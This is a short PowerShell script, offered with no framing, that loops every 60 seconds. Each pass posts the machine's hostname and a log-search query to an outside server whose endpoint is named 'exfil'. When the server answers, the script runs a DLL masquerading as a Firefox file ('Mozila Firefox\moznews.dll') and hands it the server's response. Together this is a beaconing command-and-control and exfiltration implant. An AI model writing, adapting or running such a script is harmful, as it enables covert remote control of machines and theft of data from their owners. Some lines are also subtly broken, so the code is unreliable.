$last = Get-Date;
$me = hostname;
while ($true) {
    $Url = "https://server.newyorktimes.com:5867/services/jobs/exfil";
    $Body = @{
        key = "${me}"
        search = "search index=_internal | reverse | table index,host,source,sourcetype,_raw"
        output_mode = "csv"
        earliest_time = "${last}"
        latest_time = "${Get-Date}"
    };
    $result = Invoke-RestMethod -Method 'Post' -Uri $url -Body $body -SkipHttpErrorCheck -StatusCodeVariable $status;
    if ($status -eq "200") {
        $last = Get-Date;
        if ((Test-Path "C:\Program Files\Mozila Firefox\moznews.dll") -eq $true) {
            Invoke-Item (start powershell "C:\Program Files\Mozila Firefox\moznews.dll" $result);
        }
    }
    Start-Sleep 60;
}